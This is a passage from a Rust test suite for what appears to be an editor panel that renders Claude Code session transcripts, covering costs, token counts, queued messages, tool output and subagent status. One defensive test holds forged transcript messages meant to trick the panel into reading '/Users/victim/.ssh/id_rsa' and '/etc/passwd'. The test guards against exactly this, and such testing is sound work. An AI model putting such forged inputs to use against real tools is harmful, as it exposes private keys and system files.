            ..Default::default()
        });
        assert_eq!(
            session_cost(&spend).as_deref(),
            Some("$173"),
            "Claude Code's own figure, unmarked"
        );
    }

    /// Context size now sits in the meter, and a compaction is explained in that
    /// meter's tooltip rather than as a "94K ctx" fact.
    #[test]
    fn a_context_read_from_a_compaction_says_so() {
        let measured = Spend {
            context_tokens: 94_578,
            ..Default::default()
        };
        let meter = context_meter(None, &measured, false).expect("a measured context is shown");
        assert!(
            meter.label.as_ref().contains("ctx"),
            "without a window the meter is a number only: {:?}",
            meter.label
        );
        assert_eq!(meter.tooltip, None);

        let compacted = Spend {
            context_tokens: 14_846,
            context_is_post_compaction: true,
            ..Default::default()
        };
        let meter = context_meter(None, &compacted, false).expect("a compacted context is shown");
        assert!(
            meter.tooltip.as_deref().is_some_and(
                |tooltip| tooltip.contains("(compacted)") || tooltip.contains("compaction")
            ),
            "compaction is explained on the meter: {:?}",
            meter.tooltip
        );
    }

    /// A model with no known rates must produce no figure rather than a wrong one.
    #[test]
    fn a_session_on_an_unknown_model_shows_no_cost() {
        let spend = Spend {
            model: Some("some-unreleased-model".into()),
            usage: Usage {
                output_tokens: 1_000_000,
                ..Default::default()
            },
            ..Default::default()
        };

        assert_eq!(session_cost(&spend), None);
        assert!(
            !session_facts(&spend).iter().any(|fact| fact.contains('$')),
            "and nothing in the toolbar claims a price: {:?}",
            session_facts(&spend)
        );
    }

    /// The three kinds of input are priced twenty-fold apart, so a single "in" figure
    /// said nothing about where an answer's money went.
    #[test]
    fn the_cost_line_names_each_kind_of_input() {
        let rates = rates_for_model("claude-opus-5").expect("opus 5 is priced");
        // The shape a real answer has: almost nothing fresh, a large cache read, and a
        // cache write when the conversation grew since the last one.
        let usage = Usage {
            input_tokens: 2,
            cache_read_tokens: 29_592,
            cache_write_1h_tokens: 27_456,
            cache_write_5m_tokens: 0,
            output_tokens: 488,
            thinking_tokens: 335,
        };

        assert_eq!(
            answer_summary(usage, rates, None),
            // The cache write dominates: 27,456 tokens at twice the input rate is
            // $0.275 of the $0.302, while the 29,592 read tokens are $0.015.
            "$0.30 · 2 in · 29K cache read · 27K cache write (1h) · 488 out · (335 thinking)"
        );
    }

    /// A cache write's length is only an expiry once there is a time to count it from,
    /// and the reader counts from their own clock rather than from UTC.
    #[test]
    fn the_cost_line_says_when_the_answer_came_back() {
        let rates = rates_for_model("claude-opus-5").expect("opus 5 is priced");
        let usage = Usage {
            cache_write_1h_tokens: 10_000,
            output_tokens: 10,
            ..Default::default()
        };
        // Written by Claude Code as RFC 3339 in UTC; read back on whichever clock the
        // reader is on, which is what makes "(1h)" mean an hour from something.
        let written = answered_at(&serde_json::json!({
            "timestamp": "2026-09-13T15:11:12.113Z"
        }))
        .expect("a record carrying a timestamp says when it was written");

        let expected_local = chrono::DateTime::parse_from_rfc3339("2026-09-13T15:11:12.113Z")
            .expect("the fixture parses")
            .with_timezone(&chrono::Local)
            .format("%H:%M")
            .to_string();
        assert_eq!(written.as_ref(), expected_local);

        assert_eq!(
            answer_summary(usage, rates, Some(&written)),
            format!("{expected_local} · $0.10 · 10K cache write (1h) · 10 out"),
            "the time leads the line, because everything after it is dated by it"
        );
    }

    /// A wrong time is worse than none: nothing about one looks wrong.
    #[test]
    fn a_record_with_no_readable_timestamp_says_no_time() {
        assert_eq!(answered_at(&serde_json::json!({})), None);
        assert_eq!(
            answered_at(&serde_json::json!({ "timestamp": "not a time" })),
            None
        );
    }

    /// The two lengths are priced differently and expire differently, and the line said
    /// neither: a reader could not tell what the write had cost, nor how long the next
    /// answer had to start before it paid for the same thing again.
    #[test]
    fn the_cost_line_says_how_long_a_cache_write_lives() {
        let rates = rates_for_model("claude-opus-5").expect("opus 5 is priced");

        let five_minutes = Usage {
            cache_write_5m_tokens: 10_000,
            output_tokens: 10,
            ..Default::default()
        };
        assert_eq!(
            answer_summary(five_minutes, rates, None),
            // 10,000 tokens at a quarter more than the $5 input rate.
            "$0.06 · 10K cache write (5m) · 10 out"
        );

        let an_hour = Usage {
            cache_write_1h_tokens: 10_000,
            output_tokens: 10,
            ..Default::default()
        };
        assert_eq!(
            answer_summary(an_hour, rates, None),
            // The same tokens at twice that rate, which is what the label is for.
            "$0.10 · 10K cache write (1h) · 10 out"
        );

        let both = Usage {
            cache_write_1h_tokens: 10_000,
            cache_write_5m_tokens: 2_000,
            output_tokens: 10,
            ..Default::default()
        };
        assert_eq!(
            answer_summary(both, rates, None),
            "$0.11 · 10K cache write (1h) · 2000 cache write (5m) · 10 out",
            "an answer that wrote both is two figures, because they expire at two times"
        );
    }

    /// Most answers only read from the cache, and a line of zeroes reads as noise.
    #[test]
    fn the_cost_line_leaves_out_what_an_answer_did_not_use() {
        let rates = rates_for_model("claude-opus-5").expect("opus 5 is priced");
        let usage = Usage {
            cache_read_tokens: 100_000,
            output_tokens: 50,
            ..Default::default()
        };

        assert_eq!(
            answer_summary(usage, rates, None),
            "$0.05 · 100K cache read · 50 out",
            "no fresh input, no cache write, and no thinking to report"
        );
    }

    /// Every registered process is alive, because `updatedAt` is not a heartbeat and a
    /// quiet session cannot be filtered out for being quiet. So the row has to say which
    /// ones have sat untouched, and stay quiet about the ones simply between turns.
    #[test]
    fn only_a_session_left_sitting_reports_how_long() {
        const MINUTE: i64 = 60 * 1000;
        const HOUR: i64 = 60 * MINUTE;
        let now = 1_789_000_000_000;

        assert_eq!(
            idle_for(Some(now - 30 * 1000), now),
            None,
            "half a minute is a session between turns"
        );
        assert_eq!(
            idle_for(Some(now - 9 * MINUTE), now),
            None,
            "and so is nine minutes"
        );
        assert_eq!(
            idle_for(Some(now - 45 * MINUTE), now).as_deref(),
            Some("idle 45m")
        );
        assert_eq!(
            idle_for(Some(now - 33 * HOUR), now).as_deref(),
            Some("idle 33h")
        );
        assert_eq!(
            idle_for(Some(now - 58 * HOUR), now).as_deref(),
            Some("idle 2d"),
            "past a day the hours stop being the useful unit"
        );
        assert_eq!(
            idle_for(None, now),
            None,
            "a registration with no timestamp says nothing rather than claiming zero"
        );
    }

    #[test]
    fn small_amounts_keep_their_cents() {
        assert_eq!(format_usd(0.004), "$0.00");
        assert_eq!(format_usd(0.42), "$0.42");
        assert_eq!(format_usd(9.99), "$9.99");
        assert_eq!(format_usd(10.4), "$10", "above ten the cents are noise");
        assert_eq!(format_usd(141.75), "$142");
    }

    #[test]
    fn token_counts_read_as_a_reader_reads_them() {
        assert_eq!(compact_token_count(0), "0");
        assert_eq!(compact_token_count(9_999), "9999");
        assert_eq!(compact_token_count(534_777), "534K");
        assert_eq!(compact_token_count(2_300_000), "2.3M");
    }

    /// A message typed while the session was answering. Claude Code records the text
    /// only in a `queued_command` attachment, and writes the user record it belongs to
    /// with empty content, so the reader's own words were drawn nowhere in the
    /// conversation — they were folded into the context section with the injected
    /// attachments, and the record that should have carried them was skipped as empty.
    #[test]
    fn a_message_queued_behind_a_turn_is_drawn_as_the_readers_own() {
        let entries = entries_of(&[
            r#"{"type":"user","uuid":"a","message":{"content":"what I asked first"}}"#,
            r#"{"type":"attachment","uuid":"b","parentUuid":"a",
"attachment":{"type":"queued_command","prompt":"and this while it was busy"}}"#,
            // The record the queued message belongs to, as Claude Code writes it.
            r#"{"type":"user","uuid":"c","parentUuid":"b","message":{"content":""}}"#,
        ]);

        let messages = message_sources(&entries);
        assert_eq!(
            messages,
            vec![
                SharedString::from("what I asked first"),
                SharedString::from("and this while it was busy"),
            ],
            "the queued message is one of the reader's messages, in the order they typed \
             it, and is drawn exactly once"
        );
        assert!(
            !entries
                .iter()
                .any(|entry| matches!(entry.kind, EntryKind::Attachments { .. })),
            "it is not context injected around the turn, so it does not fold into that \
             section"
        );
    }

    /// Context Claude Code injects into a turn — a skill's instructions, an expanded
    /// command — carries the user's own role and can run to tens of thousands of lines.
    #[test]
    fn injected_context_is_not_drawn_as_a_message() {
        let entries = entries_of(&[
            r#"{"type":"user","uuid":"a","message":{"content":"what I typed"}}"#,
            r#"{"type":"user","uuid":"b","parentUuid":"a","isMeta":true,
"message":{"content":"Base directory for this skill: ..."}}"#,
        ]);

        assert_eq!(
            message_sources(&entries),
            vec![SharedString::from("what I typed")],
            "only what the reader typed is theirs"
        );
    }

    /// A background command reporting in is queued the same way a message typed mid-turn
    /// is, so the panel drew the CLI's own `<task-notification>` block as words the reader
    /// had typed — several screenfuls of them over a long session.
    #[test]
    fn a_queued_task_notification_is_not_drawn_as_a_message() {
        let entries = entries_of(&[
            r#"{"type":"attachment","uuid":"a","parentUuid":"z","attachment":{
"type":"queued_command","commandMode":"task-notification","prompt":
"<task-notification>\n<task-id>byygs214e</task-id>\n<status>completed</status>\n</task-notification>"}}"#,
            r#"{"type":"attachment","uuid":"b","parentUuid":"a","attachment":{
"type":"queued_command","prompt":"and this is mine"}}"#,
        ]);

        assert_eq!(
            message_sources(&entries),
            vec![SharedString::from("and this is mine")],
            "the notification is the CLI's, and only the typed message is the reader's"
        );
    }

    /// A queued message with an image in it is recorded as content blocks, and the blocks
    /// carry the image's base64 beside the text.
    #[test]
    fn a_queued_message_with_an_image_is_drawn_from_its_text() {
        let entries = entries_of(&[
            r#"{"type":"attachment","uuid":"a","parentUuid":"z","attachment":{
"type":"queued_command","prompt":[
{"type":"text","text":"look at this"},
{"type":"image","source":{"type":"base64","media_type":"image/png","data":"AAAABBBB"}}]}}"#,
        ]);

        assert_eq!(
            message_sources(&entries),
            vec![SharedString::from("look at this")],
            "the text is the message; the encoded image is not part of it"
        );
    }

    /// Verbatim attachment Claude Code writes when a channel message arrives mid-turn.
    /// Origin is nested under `attachment.origin`, not at the record top level.
    const QUEUED_CHANNEL_CLEAR_ATTACHMENT: &str = r#"{"parentUuid":"3dae0f7f-...","isSidechain":false,"attachment":{"type":"queued_command","prompt":"<channel source=\"zed-claude\" from=\"zed\" sent_at_ms=\"1789805279902\">\n/clear\n</channel>","source_uuid":"796c722f-...","commandMode":"prompt","origin":{"kind":"channel","server":"zed-claude"},"timestamp":"2026-09-19T08:07:59.904Z","isMeta":true},"type":"attachment","uuid":"413be2e5-...","timestamp":"2026-09-19T08:07:59.904Z","sessionId":"0c6c5530-...","version":"2.1.276"}"#;

    #[test]
    fn queued_command_prompt_unwraps_a_channel_envelope_queued_while_busy() {
        let record = record(QUEUED_CHANNEL_CLEAR_ATTACHMENT);
        let prompt = queued_command_prompt(&record);
        assert_eq!(
            prompt.as_deref(),
            Some("/clear"),
            "a channel queued_command must be the inner text; got {:?}",
            prompt.as_deref()
        );
    }

    #[test]
    fn queued_command_prompt_keeps_a_channel_envelope_when_origin_is_not_channel() {
        let envelope = "<channel source=\"zed-claude\" from=\"zed\" sent_at_ms=\"1789805279902\">\n/clear\n</channel>";

        let without_origin = record(
            &serde_json::json!({
                "type": "attachment",
                "uuid": "no-origin",
                "attachment": {
                    "type": "queued_command",
                    "prompt": envelope,
                },
            })
            .to_string(),
        );
        let without_origin_prompt = queued_command_prompt(&without_origin);
        assert_eq!(
            without_origin_prompt.as_deref(),
            Some(envelope),
            "no origin must not unwrap a quoted envelope; got {:?}",
            without_origin_prompt.as_deref()
        );

        let human_origin = record(
            &serde_json::json!({
                "type": "attachment",
                "uuid": "human-origin",
                "attachment": {
                    "type": "queued_command",
                    "prompt": envelope,
                    "origin": {"kind": "human"},
                },
            })
            .to_string(),
        );
        let human_origin_prompt = queued_command_prompt(&human_origin);
        assert_eq!(
            human_origin_prompt.as_deref(),
            Some(envelope),
            "origin.kind human must not unwrap a quoted envelope; got {:?}",
            human_origin_prompt.as_deref()
        );
    }

    #[test]
    fn attachments_fold_after_the_user_message_of_their_turn() {
        let entries = entries_of(&[
            r#"{"type":"user","uuid":"a","message":{"content":"hello"}}"#,
            r#"{"type":"attachment","uuid":"b","attachment":{"type":"environment"},"rendered":[{"content":"env text"}]}"#,
            r#"{"type":"attachment","uuid":"c","attachment":{"type":"diagnostics"},"rendered":[{"content":"diag text"}]}"#,
        ]);

        assert_eq!(entries.len(), 2);
        assert!(
            matches!(entries[0].kind, EntryKind::Message { .. }),
            "the user message leads the turn"
        );
        let EntryKind::Attachments { items } = &entries[1].kind else {
            panic!("expected the attachments section after the user message");
        };
        assert_eq!(items.len(), 2);
        assert_eq!(items[0].label.as_ref(), "environment");
        assert_eq!(items[1].body.as_ref(), "diag text");
    }

    /// Timing the CLI writes when a turn closes: how long it took, how many messages
    /// were in it, and how many background agents are still running.
    #[test]
    fn a_turn_duration_record_is_drawn_as_a_footer() {
        let entries = entries_of(&[
            r#"{"type":"user","uuid":"a","message":{"content":"hello"}}"#,
            r#"{"type":"system","subtype":"turn_duration","uuid":"b","parentUuid":"a",
"durationMs":272000,"messageCount":209,"pendingBackgroundAgentCount":2}"#,
        ]);

        assert_eq!(
            entries.len(),
            2,
            "the timing record closes the turn rather than being dropped; entry keys: {:?}",
            entries.iter().map(|entry| &entry.key).collect::<Vec<_>>()
        );
        assert!(
            matches!(entries[0].kind, EntryKind::Message { .. }),
            "the message before it is kept"
        );
        match &entries[1].kind {
            EntryKind::TurnFooter {
                duration_ms,
                message_count,
                pending_background_agents,
            } => {
                assert_eq!(*duration_ms, 272000);
                assert_eq!(*message_count, 209);
                assert_eq!(*pending_background_agents, 2);
            }
            other => panic!(
                "expected a turn footer, got {}",
                match other {
                    EntryKind::Unknown { label, .. } => label.to_string(),
                    _ => "a different entry".to_string(),
                }
            ),
        }
    }

    #[test]
    fn unknown_record_and_block_types_survive_as_raw_json() {
        let entries = entries_of(&[
            r#"{"type":"queue-operation","uuid":"a","operation":"drain"}"#,
            r#"{"type":"assistant","uuid":"b","message":{"content":[{"type":"future_block","payload":7}]}}"#,
        ]);

        assert_eq!(entries.len(), 2);
        let EntryKind::Unknown { label, raw } = &entries[0].kind else {
            panic!("expected an unknown record entry");
        };
        assert_eq!(label.as_ref(), "queue-operation");
        assert!(raw.contains("drain"));

        let EntryKind::Unknown { label, raw } = &entries[1].kind else {
            panic!("expected an unknown block entry");
        };
        assert_eq!(label.as_ref(), "future_block");
        assert!(raw.contains("payload"));
    }

    #[test]
    fn compact_boundary_carries_its_metadata() {
        let entries = entries_of(&[
            r#"{"type":"system","subtype":"compact_boundary","uuid":"a","content":"Conversation compacted",
                "compactMetadata":{"trigger":"manual","preTokens":792090,"postTokens":16995}}"#,
        ]);

        assert!(matches!(
            &entries[0].kind,
            EntryKind::CompactBoundary { trigger, pre_tokens, post_tokens }
                if trigger.as_ref() == "manual"
                    && *pre_tokens == Some(792090)
                    && *post_tokens == Some(16995)
        ));
    }

    #[test]
    fn local_command_content_is_stripped_of_ansi_escapes() {
        // The escapes are written as JSON `\u001b`, because a raw control character
        // cannot appear inside a JSON string.
        let entries = entries_of(&[
            r#"{"type":"system","subtype":"local_command","uuid":"a","content":"\u001b[1;31mred\u001b[0m plain"}"#,
        ]);

        assert!(matches!(
            &entries[0].kind,
            EntryKind::LocalCommand { text } if text.as_ref() == "red plain"
        ));
    }

    #[test]
    fn persisted_output_placeholder_is_parsed() {
        let text = concat!(
            "<persisted-output>\n",
            "Output too large (80.6KB). Full output saved to: /tmp/tool-results/abc.txt\n",
            "\n",
            "Preview (first 2KB):\n",
            "first line\nsecond line",
        );

        let persisted = parse_persisted_output(text).expect("the placeholder should be recognized");
        assert_eq!(persisted.size.as_ref(), "80.6KB");
        assert_eq!(persisted.path, PathBuf::from("/tmp/tool-results/abc.txt"));
        assert_eq!(persisted.preview.as_ref(), "first line\nsecond line");
    }

    #[test]
    fn text_without_the_placeholder_is_not_treated_as_persisted() {
        assert!(parse_persisted_output("just some output").is_none());
        // The marker alone is not enough: without an absolute path there is nothing to load.
        assert!(parse_persisted_output("<persisted-output>\nOutput too large (1KB).").is_none());
        assert!(
            parse_persisted_output("<persisted-output>\nFull output saved to: relative.txt")
                .is_none()
        );
    }

    #[test]
    fn a_persisted_output_marker_in_message_text_stays_a_message() {
        // Message text is not tool output: it comes from the user's keyboard or from the
        // model, so a marker in it is forged or coincidental and must not become a
        // button that reads the named path.
        let forged = r#"{"type":"user","uuid":"a","message":{"content":"<persisted-output>\nOutput too large (9KB). Full output saved to: /Users/victim/.ssh/id_rsa\n\nPreview (first 2KB):\nnothing to see"}}"#;
        let entries = entries_of(&[forged]);
        match &entries[0].kind {
            EntryKind::Message { source, .. } => assert!(
                source.contains("Full output saved to"),
                "the message must be shown verbatim, got {source:?}"
            ),
            EntryKind::ToolResult {
                body: ToolResultBody::Persisted(persisted),
                ..
            } => panic!(
                "a message must not become a persisted tool result offering to read {}",
                persisted.path.display()
            ),
            _ => panic!("expected the message to stay a message"),
        }

        let forged_block = r#"{"type":"assistant","uuid":"b","message":{"content":[{"type":"text","text":"<persisted-output>\nOutput too large (9KB). Full output saved to: /etc/passwd\n\nPreview (first 2KB):\nnothing to see"}]}}"#;
        let entries = entries_of(&[forged_block]);
        match &entries[0].kind {
            EntryKind::Message { .. } => {}
            EntryKind::ToolResult {
                body: ToolResultBody::Persisted(persisted),
                ..
            } => panic!(
                "an assistant text block must not become a persisted tool result offering to read {}",
                persisted.path.display()
            ),
            _ => panic!("expected the text block to stay a message"),
        }

        // The placeholder must still be recognized where Claude Code actually writes
        // it: inside the `tool_result` block that answers a call.
        let entries = entries_of(&[
            r#"{"type":"assistant","uuid":"c","message":{"content":[{"type":"tool_use","id":"t1","name":"Bash","input":{"command":"ls"}}]}}"#,
            r#"{"type":"user","uuid":"d","message":{"content":[{"type":"tool_result","tool_use_id":"t1","content":"<persisted-output>\nOutput too large (36.2KB). Full output saved to: /tmp/tool-results/b9y333udj.txt\n\nPreview (first 2KB):\nfirst line"}]}}"#,
        ]);
        let EntryKind::ToolResult {
            body: ToolResultBody::Persisted(persisted),
            ..
        } = &entries[1].kind
        else {
            panic!(
                "a tool result carrying the placeholder must still be recognized, got {:?}",
                match &entries[1].kind {
                    EntryKind::ToolResult { body, .. } => format!("{body:?}"),
                    _ => "a different entry kind".to_string(),
                }
            );
        };
        assert_eq!(
            persisted.path,
            PathBuf::from("/tmp/tool-results/b9y333udj.txt")
        );
        assert_eq!(persisted.size.as_ref(), "36.2KB");
    }

    #[test]
    fn an_unterminated_escape_must_not_swallow_the_output_after_it() {
        // Output captured mid-sequence loses the terminator, and a string sequence has
        // no other end, so everything after it would disappear.
        let osc = strip_ansi_escapes("\u{1b}]0;title\nbuild finished\nall tests passed");
        assert_eq!(
            osc, "\nbuild finished\nall tests passed",
            "an OSC without BEL or ST must end at the newline; got {osc:?}"
        );

        let dcs = strip_ansi_escapes("\u{1b}Pq#0;2;0;0;0\nsecond line");
        assert_eq!(
            dcs, "\nsecond line",
            "a DCS without ST must end at the newline; got {dcs:?}"
        );

        let csi = strip_ansi_escapes("\u{1b}[3\nfailed: 2 tests");
        assert_eq!(
            csi, "\nfailed: 2 tests",
            "a CSI without a final byte must end at the newline; got {csi:?}"
        );

        // What the newline guard must not kill: every properly terminated sequence is
        // still removed whole, including ones whose payload looks like text.
        assert_eq!(strip_ansi_escapes("\u{1b}]0;title\u{7}body"), "body");
        assert_eq!(
            strip_ansi_escapes("\u{1b}]8;;https://example.com\u{1b}\\link\u{1b}]8;;\u{1b}\\ after"),
            "link after"
        );
        assert_eq!(
            strip_ansi_escapes("\u{1b}[1;31mred\u{1b}[0m plain"),
            "red plain"
        );
        assert_eq!(
            strip_ansi_escapes("\u{1b}Pq#0;2;0;0;0#0~~@@vv@@~~@@~~$\u{1b}\\kept"),
            "kept"
        );
    }

    /// `toolUseResult` sits on the record while `tool_result` blocks sit inside it, so
    /// it can only ever name one of the answers a record carries. A record answering two
    /// calls at once must not show the first call's output under the second call's name.
    #[test]
    fn two_results_in_one_record_each_keep_their_own_output() {
        let entries = entries_of(&[
            r#"{"type":"assistant","uuid":"a","message":{"content":[
                {"type":"tool_use","id":"t1","name":"Bash","input":{"command":"echo one"}},
                {"type":"tool_use","id":"t2","name":"Bash","input":{"command":"echo two"}}]}}"#,
            r#"{"type":"user","uuid":"b","toolUseResult":{"stdout":"OUTPUT-ONE","stderr":""},
                "message":{"content":[
                {"type":"tool_result","tool_use_id":"t1","content":"OUTPUT-ONE"},
                {"type":"tool_result","tool_use_id":"t2","content":"OUTPUT-TWO"}]}}"#,
        ]);

        let bodies: Vec<SharedString> = entries
            .iter()
            .filter_map(|entry| match &entry.kind {
                EntryKind::ToolResult {
                    body: ToolResultBody::Inline(text),
                    ..
                } => Some(text.clone()),
                _ => None,
            })
            .collect();

        assert_eq!(
            bodies,
            vec![
                SharedString::from("OUTPUT-ONE"),
                SharedString::from("OUTPUT-TWO")
            ],
            "the record's own `toolUseResult` answers one of the two calls, so each \
             block's own content is what says what its call returned"
        );
    }

    #[test]
    fn a_structured_result_without_text_falls_back_to_the_content_block() {
        // The shape a `Read` leaves behind: the structured result holds the raw file,
        // while the readable, line-numbered rendering sits in the content block.
        let entries = entries_of(&[
            r#"{"type":"assistant","uuid":"a","message":{"content":[{"type":"tool_use","id":"t1","name":"Read","input":{"file_path":"/tmp/x.yaml"}}]}}"#,
            r#"{"type":"user","uuid":"b","toolUseResult":{"type":"text","file":{"filePath":"/tmp/x.yaml","content":"game: mapleidel\nsecond line\n"}},
                "message":{"content":[{"type":"tool_result","tool_use_id":"t1","content":"1\tgame: mapleidel\n2\tsecond line"}]}}"#,
        ]);

        let EntryKind::ToolResult { label, body, .. } = &entries[1].kind else {
            panic!("expected a tool result");
        };
        assert_eq!(label.as_ref(), "Read");
        assert_eq!(
            body,
            &ToolResultBody::Inline(SharedString::from("1\tgame: mapleidel\n2\tsecond line")),
            "the readable rendering must be preferred over escaped JSON"
        );

        // What the fallback must not kill: a result shape with neither readable text nor
        // a content block beside it is still shown as raw JSON rather than dropped.
        let entries = entries_of(&[
            r#"{"type":"assistant","uuid":"a","message":{"content":[{"type":"tool_use","id":"t1","name":"Search","input":{}}]}}"#,
            r#"{"type":"user","uuid":"b","toolUseResult":{"matches":3,"query":"needle"},
                "message":{"content":[{"type":"tool_result","tool_use_id":"t1"}]}}"#,
        ]);
        let EntryKind::ToolResult {
            body: ToolResultBody::Inline(text),
            ..
        } = &entries[1].kind
        else {
            panic!("expected an inline tool result");
        };
        assert!(
            text.contains("\"matches\": 3") && text.contains("\"query\": \"needle\""),
            "an unknown result shape must still be readable as JSON, got {text:?}"
        );
    }

    #[gpui::test]
    async fn persisted_output_is_read_up_to_the_cap_and_truncation_is_reported(
        cx: &mut gpui::TestAppContext,
    ) {
        let source = LocalSource::new(cx.executor());
        let directory =
            std::env::temp_dir().join(format!("claude-sessions-output-cap-{}", std::process::id()));
        std::fs::create_dir_all(&directory).expect("creating the temporary directory");
        let cap = MAX_PERSISTED_OUTPUT_BYTES as usize;

        let read = |path: PathBuf| source.read_file(path, MAX_PERSISTED_OUTPUT_BYTES);

        // A file of exactly the cap is legal input and must arrive whole and unlabelled.
        let at_cap = directory.join("at-cap.txt");
        std::fs::write(&at_cap, vec![b'x'; cap]).expect("writing the fixture");
        let text = persisted_output_text(
            read(at_cap.clone())
                .await
                .expect("reading the file at the cap"),
        );
        assert_eq!(
            text.len(),
            cap,
            "a file of exactly the cap must be returned whole, got {} bytes for {cap}",
            text.len()
        );
        assert!(
            !text.contains("truncated"),
            "a file of exactly the cap must not be reported as truncated"
        );

        let over_cap = directory.join("over-cap.txt");
        std::fs::write(&over_cap, vec![b'x'; cap + 1]).expect("writing the fixture");
        let text = persisted_output_text(
            read(over_cap.clone())
                .await
                .expect("reading the file over the cap"),
        );
        let kept = text.chars().filter(|character| *character == 'x').count();
        assert_eq!(
            kept, cap,
            "exactly the cap of content must survive, kept {kept} of {cap}"
        );
        assert!(
            text.contains("truncated by the panel"),
            "a file over the cap must say so, got a tail of {:?}",
            &text[text.len().saturating_sub(80)..]
        );

        std::fs::remove_dir_all(&directory).ok();
    }

    #[test]
    fn the_language_of_a_tool_call_follows_the_file_it_names() {
        for (path, language) in [
            ("/a/b/main.rs", "rust"),
            ("/a/b/migrate.py", "python"),
            ("/a/b/panel.ts", "typescript"),
            ("/a/b/settings.json", "json"),
            ("/a/b/README.md", "markdown"),
        ] {
            assert_eq!(
                language_for_path(path),
                language,
                "the language {path} is drawn in"
            );
        }
    }

    #[test]
    fn a_target_with_no_extension_this_panel_knows_is_left_as_plain_text() {
        assert_eq!(language_for_path("/a/b/notes.xyz"), "");
        assert_eq!(language_for_path("/a/b/Makefile"), "");
        assert_eq!(language_for_path(""), "");
    }

    #[test]
    fn a_bash_call_is_drawn_as_the_command_it_runs() {
        let input = json_text(&serde_json::json!({
            "command": "cd /Users/user/zed && npx ts-node scripts/migrate.ts --apply",
            "description": "Run the migration",
        }));
        let display = tool_input_display(BASH_TOOL_NAME, &input);

        assert_eq!(
            display.text.as_ref(),
            "cd /Users/user/zed && npx ts-node scripts/migrate.ts --apply",
            "the command itself is what the call is"
        );
        assert_eq!(
            display.code_block().as_ref(),
            "```bash\ncd /Users/user/zed && npx ts-node scripts/migrate.ts --apply\n```",
            "a command is handed to the markdown element as shell, not as the JSON around it"
        );
    }

    /// A file tool's input is drawn as the file content it carries, in that file's
    /// language. `Read` carries no content — only the path — so it keeps its input, and
    /// that input is JSON rather than the named file's language.
    #[test]
    fn a_file_tool_is_drawn_in_the_language_of_the_file_it_names() {
        let written = "fn main() {}\n";
        let input = json_text(&serde_json::json!({
            "file_path": "/a/b/session_store.rs",
            "content": written,
        }));
        let display = tool_input_display("Write", &input);

        assert_eq!(display.language, "rust");
        assert_eq!(
            display.text.as_ref(),
            written,
            "what a write call is, is the content it writes"
        );
        assert_eq!(
            display.code_block().lines().next().unwrap_or_default(),
            "```rust",
            "the fence of {:?}",
            display.code_block()
        );

        let read_input = json_text(&serde_json::json!({ "file_path": "/a/b/session_store.rs" }));
        let read_display = tool_input_display("Read", &read_input);
        assert_eq!(
            read_display.language, "json",
            "a `Read` call holds a path and no content, so drawing its input as Rust \
             labels JSON as Rust"
        );
        assert_eq!(read_display.text.as_ref(), read_input.as_str());
    }

    #[test]
    fn each_file_tool_is_drawn_as_the_text_it_carries() {
        for (tool_name, field) in [
            ("Write", "content"),
            ("Edit", "new_string"),
            ("NotebookEdit", "new_source"),
        ] {
            let carried = "print('hi')\n";
            let input = json_text(&serde_json::json!({
                "file_path": "/a/b/script.py",
                field: carried,
            }));
            let display = tool_input_display(tool_name, &input);

            assert_eq!(
                display.text.as_ref(),
                carried,
                "{tool_name} must be drawn as its `{field}`"
            );
            assert_eq!(
                display.language, "python",
                "{tool_name} keeps the language of the file it names"
            );
        }
    }

    /// The field a tool usually carries is not always there — an `Edit` that only sets
    /// `old_string`, a half-written call read mid-write — and the whole input is the only
    /// honest thing left to draw.
    #[test]
    fn a_file_tool_missing_its_content_falls_back_to_the_whole_input() {
        let input = json_text(&serde_json::json!({
            "file_path": "/a/b/main.rs",
            "old_string": "let a = 1;",
        }));
        let display = tool_input_display("Edit", &input);

        assert_eq!(
            display.text.as_ref(),
            input.as_str(),
            "with nothing to draw as the file's language, the input itself is what there is"
        );
        assert_eq!(
            display.language, "json",
            "and it must be labelled as the JSON it is"
        );
    }

    #[test]
    fn every_other_tool_keeps_its_input_as_json() {
        let input = json_text(&serde_json::json!({ "pattern": "TODO" }));
        let display = tool_input_display("Grep", &input);

        assert_eq!(display.language, "json");
        assert_eq!(display.text.as_ref(), input.as_str());
    }

    fn subagent(
        agent_id: &str,
        workflow_run_id: Option<&str>,
        tool_use_id: Option<&str>,
    ) -> SubagentSummary {
        SubagentSummary {
            agent_id: agent_id.to_string(),
            workflow_run_id: workflow_run_id.map(str::to_string),
            meta: SubagentMeta {
                agent_type: "general-purpose".to_string(),
                description: None,
                tool_use_id: tool_use_id.map(str::to_string),
                spawn_depth: 1,
                model: None,
                workflow_phase: None,
                request_shape: None,
            },
            transcript_path: PathBuf::from("/nowhere/agent.jsonl"),
            size: 0,
            workflow_agent_finished: None,
            task_agent_finished: None,
        }
    }

    fn state_of(summary: &SubagentSummary, json_lines: &[&str]) -> AgentState {
        let records: Vec<TranscriptRecord> = json_lines.iter().map(|line| record(line)).collect();
        let path: Vec<&TranscriptRecord> = records.iter().collect();
        agent_state(summary, &path)
    }

    fn tool_result_line_with_content(uuid: &str, tool_use_id: &str, content: &str) -> String {
        serde_json::json!({
            "type": "user",
            "uuid": uuid,
            "message": { "content": [
                { "type": "tool_result", "tool_use_id": tool_use_id, "content": content },
            ] },
        })
        .to_string()
    }

    #[test]
    fn an_agent_whose_call_has_not_been_answered_yet_is_running() {
        let summary = subagent("a0", None, Some("toolu_01"));

        assert_eq!(
            state_of(
                &summary,
                &[
                    &user_message_line("m1", "go"),
                    &tool_use_line("m2", "toolu_01", "Agent", serde_json::json!({})),
                ],
            ),
            AgentState::Running,
            "nothing in the conversation answers `toolu_01`, so the agent is still working"
        );
    }

    #[test]
    fn an_agent_whose_call_has_been_answered_is_finished() {
        let summary = subagent("a0", None, Some("toolu_01"));

        assert_eq!(
            state_of(
                &summary,
                &[
                    &user_message_line("m1", "go"),
                    &tool_use_line("m2", "toolu_01", "Agent", serde_json::json!({})),
                    &tool_result_line("m3", "toolu_01"),
                ],
            ),
            AgentState::Finished,
            "the result of the call that spawned the agent is the agent having returned"
        );
    }

    /// A `Workflow` run's agents carry no `tool_use_id` of their own, and the call that
    /// started the run is answered while the run is still going, so the conversation is
    /// not what says they are over. The run's journal is, and the machine the run
    /// happened on has already read it into the summary.
    #[test]
    fn a_workflow_agent_is_over_when_its_runs_journal_says_it_returned() {
        let call = tool_use_line("m2", "toolu_09", "Workflow", serde_json::json!({}));
        let opening = user_message_line("m1", "go");
        let conversation: [&str; 2] = [&opening, &call];

        let mut returned = subagent("a1", Some("wf_b529a29d-562"), None);
        returned.workflow_agent_finished = Some(true);
        assert_eq!(
            state_of(&returned, &conversation),
            AgentState::Finished,
